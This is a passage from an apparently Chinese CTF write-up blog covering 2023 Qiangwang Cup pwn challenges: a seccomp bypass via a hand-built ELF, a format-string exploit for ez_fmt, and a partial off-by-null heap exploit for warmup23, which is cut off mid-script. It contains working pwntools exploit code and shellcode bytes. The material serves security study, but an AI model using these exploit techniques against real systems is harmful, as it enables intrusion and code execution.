class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x40000001</span>  <span class="keyword">if</span> (A == x32_write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x40000009</span>  <span class="keyword">if</span> (A == x32_mmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x4000000b</span>  <span class="keyword">if</span> (A == x32_munmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A != execve) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = filename &gt;&gt; <span class="number">32</span> <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0x00007fff</span>  <span class="keyword">if</span> (A != <span class="number">0x7fff</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = filename <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0xffffe29e</span>  <span class="keyword">if</span> (A == <span class="number">0xffffe29e</span>) <span class="keyword">goto</span> <span class="number">0021</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000006</span>  <span class="keyword">if</span> (A == lstat) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A != fstat) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000018</span>  A = statbuf <span class="meta"># fstat(fd, statbuf)</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这些要求其实挺苛刻的,大多数想法因该是让一个段可写可执行,自修改code,变幻出syscall</p><p>不过禁止一个段同时拥有写和执行的权限便断了这条路</p><p>也有人提到利用elf映射机制将两块物理不相邻的段映射到一起,不过貌似比较难实现</p><h2 id="解1-1"><a href="#解1-1" class="headerlink" title="解1:"></a>解1:</h2><p>解1的思路,是利用栈必然是要可读可写的</p><p>因此,在内核加载elf的判断中只判断了stack段是否有执行权限,而不关注读和写权限</p><p>load_elf_binary的源代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Stack area protections */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DEFAULT   0     <span class="comment">/* Whatever the arch defaults to */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DISABLE_X 1     <span class="comment">/* Disable executable stacks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_ENABLE_X  2     <span class="comment">/* Enable executable stacks */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> executable_stack = EXSTACK_DEFAULT;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loc-&gt;elf_ex.e_phnum; i++, elf_ppnt++)</span><br><span class="line">    <span class="keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> PT_GNU_STACK:</span><br><span class="line">        <span class="keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)</span><br><span class="line">            executable_stack = EXSTACK_ENABLE_X;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            executable_stack = EXSTACK_DISABLE_X;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>即就算将stack段的权限设置为—x,那么实际运行时权限也是rwx</p><p>以此就饶过了不能同时又写和执行权限这个检查</p><p><strong>ELF十六进制:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7F454C4602010100000000000000000002003E0001000000B00040000000000040000000000000001001000000000000000000004000380002004000030002000100000005000000000000000000000000004000000000000000400000000000F500000000000000F500000000000000000020000000000051E574640100000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000048C7C0A2DBC3004835ADDE0000504989E04831F64831D25248C7C0666C6167504889E74831C0B00241FFD04889C74889E6B230B00041FFD04831FFBF01000000B00141FFD00000002E7368737472746162002E74657874000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000010000000600000000000000B000400000000000B0000000000000004700000000000000000000000000000010000000000000000000000000000000010000000300000000000000000000000000000000000000F7000000000000004700000000000000000000000000000001000000000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="解2-1"><a href="#解2-1" class="headerlink" title="解2:"></a>解2:</h2><p>解2的思路是利用程序启动时存在的vdso段</p><p>在vdso段中存在天然的syscall ret gadget</p><p>不过如何确定vdso的地址,</p><p>方法1是vdso的随机化范围很小,可以尝试爆破</p><p>方法2是在栈上能够找到指向vdso的指针,确定偏移就是</p><h2 id="seccomp-tools检测带参数elf"><a href="#seccomp-tools检测带参数elf" class="headerlink" title="seccomp-tools检测带参数elf"></a>seccomp-tools检测带参数elf</h2><p>在用seccomp-tools的过程中需要注意的是如果程序需要参数的话，可能就会分析失败。</p><p>例如本题</p><p>此时最佳办法是在prctl函数设置断点，然后dump第三个指针参数对应的内存。</p><p>之后再用disasm功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools disasm dumpfile</span><br></pre></td></tr></table></figure><h1 id="2023强网杯-ez-fmt"><a href="#2023强网杯-ez-fmt" class="headerlink" title="2023强网杯-ez_fmt"></a>2023强网杯-ez_fmt</h1><p><strong>标签:格式化字符串</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There is a gift for you %p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( w == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    w = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞,给了libc,会给栈地址</p><p>为了不让<code>w = 0</code>执行,选择修改printf的返回地址</p><p>返回到read处,因为单次长度有限,所以多次利用格式化字符串漏洞,</p><p>以此泄露libc并修改main的返回地址为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.104.24.40&#x27;,1337)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%176c%10$hhn%16224c%11$hn%19$paa&#x27;</span></span><br><span class="line">payload+=p64(stack-<span class="number">8</span>)+p64(stack-<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">stack2=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack2&#x27;</span>,stack2)</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">leak(<span class="string">&#x27;startmain&#x27;</span>,libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">243</span>)</span><br><span class="line"></span><br><span class="line">one=libc.address+<span class="number">0xe3b01</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">one=p64(one)</span><br><span class="line"><span class="comment">#irt()</span></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%9$hhn%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(one[<span class="number">2</span>],one[<span class="number">1</span>]*<span class="number">0x100</span>+one[<span class="number">0</span>]-one[<span class="number">2</span>]).ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>).encode()</span><br><span class="line">payload+=p64(stack2+<span class="number">0x68</span>+<span class="number">2</span>)+p64(stack2+<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="2023强网杯-warmup23"><a href="#2023强网杯-warmup23" class="headerlink" title="2023强网杯-warmup23"></a>2023强网杯-warmup23</h1><p><strong>标签:off-by-null|tcache attack</strong></p><p>保护机制全部开启,存在沙盒,libc是2.35版本</p><p>静态分析可以看出是常规的菜单题</p><p>但是并没有edit</p><p>看主要的add函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span> &amp;&amp; *((_QWORD *)&amp;unk_4040 + i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FUll!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = getnum();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)&amp;unk_4040 + i) = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4040 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note: &quot;</span>);</span><br><span class="line">      *(_BYTE *)(*((_QWORD *)&amp;unk_4040 + i) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_4040 + i), v2)) = <span class="number">0</span>;<span class="comment">// off-by-null</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc后即往其中输入数据,存在off-by-null,但也正是这个off-by-null使得无法有效的泄露</p><p>因此需要用到2.29及以上的off-by-null手法</p><p>见<a href="https://tttang.com/archive/1614/">glibc2.29+的off by null利用 - 跳跳糖</a></p><p>核心思想是利用部分写修改残余链信息以满足unlink条件,最终目标依然是搞出chunk overlap</p><p><u>并通过大chunk切割后remainer部分放入unsortedbin制造fd,bk泄露libc,heap则可以通过<strong>unlink后更新的bk指针</strong>泄露</u>,当然也可以释放掉刚才申请的chunk,并再往unsortedbin中释放一个chunk再次切割,使得产生的fd,bk包含heap从而泄露,不过这样更麻烦</p><p>overlap之后就可以利用其中的barrier去uaf打tcache attack从而任意写(依然无法任意读.不过用任意写stdout可以做到)</p><p>再之后做法就多样了可以</p><ol><li>任意写stdout,构造io利用链,使用puts等io函数触发io利用链</li><li>stdout泄露environ,打rop</li></ol><p>个人选择方案1,利用obstack链进行攻击,布置好结构后,首先用</p><p><code>#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code>gadget完成rdi与rdx的互相交换</p><p>之后去执行setcontext+61完成mprotect返回到shellcode处执行orw</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&quot;A&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./warmup&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;120.24.69.11&#x27;,12700)</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 A = P-&gt;fd</span></span><br><span class="line">add(<span class="number">0x108</span>-<span class="number">0x20</span>) <span class="comment">#1 barrier</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 B0 helper</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3 C0 = P , P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 barrier</span></span><br><span class="line">add(<span class="number">0x488</span>, <span class="string">b&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># H0. helper for write bk-&gt;fd. vitcim chunk.</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 D = P-&gt;bk</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D</span></span><br><span class="line"><span class="comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span></span><br><span class="line">add(<span class="number">0x458</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>]) <span class="comment">#0 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">add(<span class="number">0x418</span>)  <span class="comment">#2 C1 from ub</span></span><br><span class="line">add(<span class="number">0x428</span>)  <span class="comment">#3 bk  D  from largebin</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment">#6 fd    A from largein</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 use unsortedbin to set fd-&gt;bk</span></span><br><span class="line"><span class="comment"># partial overwrite fd -&gt; bk </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># A=P-&gt;fd</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># C1</span></span><br><span class="line"><span class="comment"># unsortedbin: C1-A ,   A-&gt;BK = C1</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment"># 2 partial overwrite bk    